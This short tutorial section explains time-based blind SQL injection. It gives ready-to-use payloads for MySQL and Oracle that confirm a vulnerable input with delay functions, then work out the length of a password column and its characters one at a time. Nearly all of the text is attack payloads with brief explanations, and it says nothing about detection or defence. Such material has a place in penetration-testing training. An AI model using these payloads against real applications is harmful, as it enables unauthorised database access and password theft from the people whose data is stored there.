This technique introduces delays to confirm whether a condition is true.

## 1. Verify Vulnerability with a Delay

For **MySQL** (SLEEP function):
```sql
' AND SLEEP(5) --  
```
For **Oracle** (DBMS_LOCK.sleep function):
```sql
' AND DBMS_LOCK.sleep(5) --  
```
If the response is **delayed**, the injection is working.

## 2. Extract Password Length
```sql
' AND IF(LENGTH(password)=10, SLEEP(5), 0) --  
```
If the delay occurs, the password is **10 characters long**.

## 3. Extract Each Character Using Delay

For **MySQL**:
```sql
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --  
```
For **Oracle**:
```sql
' AND CASE WHEN SUBSTR(password,1,1)='a' THEN DBMS_LOCK.sleep(5) ELSE NULL END --  
```
Repeat this for each character to reconstruct the full password.
